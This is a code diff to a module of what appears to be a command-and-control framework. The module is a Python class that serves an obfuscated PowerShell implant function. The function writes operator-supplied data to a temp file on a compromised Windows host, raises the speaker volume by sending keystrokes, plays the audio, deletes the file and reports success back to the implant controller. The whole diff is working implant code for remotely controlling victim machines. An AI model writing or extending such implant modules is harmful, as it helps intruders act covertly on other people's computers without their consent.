@@ -1,26 +1,20 @@
 class PlayAudio:
     type = "PS"
-    args = "sound file location (on Fudge)"
+    args = "Local sound file location"
     input = "play_audio"
 
-    def process_implant_response(self):
-        print("We're processing play audio response")
+    def process_implant_response(self, data, args):
+        return f"Audio success: {args}", None
 
     def implant_text(self):
         var = '''
 function {{ ron.obf_remote_play_audio }}($data){
-# need to checkf for $datas existance
-    $data.length
     if ($data.length -lt 4){
             $Script:tr = "1"
         }
     $file = "dev_temp_name"
     $t = "$env:TMP/$file.mp3"
-    # $t = "C:\\Users\Kris/$file.mp3"
-
-    $b = $data.substring(2)
-    $lkj = [System.Convert]::FromBase64String($b)
-    $data | Set-Content "$t" -Encoding Byte
+    $data | Set-Content "$t" -encoding Byte -NoNewLine
 
     Function Set-Speaker($Volume){$wshShell = new-object -com wscript.shell;1..50  | % {$wshShell.SendKeys([char]175)}}
     Set-Speaker -Volume 50
@@ -31,12 +25,12 @@ function {{ ron.obf_remote_play_audio }}($data){
     $mediaPlayer.Open("$t")
     $duration = 2
     $duration = $duration + $mediaPlayer.NaturalDuration.TimeSpan.TotalSeconds
-    Write-Output $duration
     $mediaPlayer.Play()
     #$duration = $mediaPlayer.NaturalDuration.TimeSpan.TotalSeconds
     sleep($duration)
     $mediaPlayer.Close()
-    Remove-Item -Confirm:$false "$t" 
+    Remove-Item -Confirm:$false "$t"
+    $Script:tr = "Audio success."
     return
 }
 
